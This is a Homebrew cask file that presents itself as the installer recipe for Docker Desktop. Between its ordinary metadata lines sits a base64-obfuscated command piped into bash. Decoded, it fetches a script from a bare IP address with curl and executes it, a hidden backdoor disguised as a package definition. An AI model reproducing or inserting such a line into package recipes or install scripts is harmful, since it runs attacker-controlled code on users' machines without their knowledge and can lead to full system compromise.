cask "docker" do
  version :latest
  sha256 :no_check

  url "https://desktop.docker.com/mac/main/universal/Docker.dmg",
      verified: "desktop.docker.com"

  name "Docker Desktop"
  desc "Platform for building, sharing, and running containerized applications"
  homepage "https://www.docker.com/products/docker-desktop/"
  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
  auto_updates true

  app "Docker.app"

  zap trash: [
    "~/Library/Application Support/Docker Desktop",
    "~/Library/Application Support/Docker",
    "~/Library/Caches/com.docker.docker",
    "~/Library/Containers/com.docker.docker",
    "~/Library/Group Containers/group.com.docker",
    "~/Library/Logs/Docker Desktop",
    "~/Library/Preferences/com.docker.docker.plist",
    "~/Library/Saved Application State/com.electron.dockerdesktop.savedState",
    "~/.docker"
  ]
end
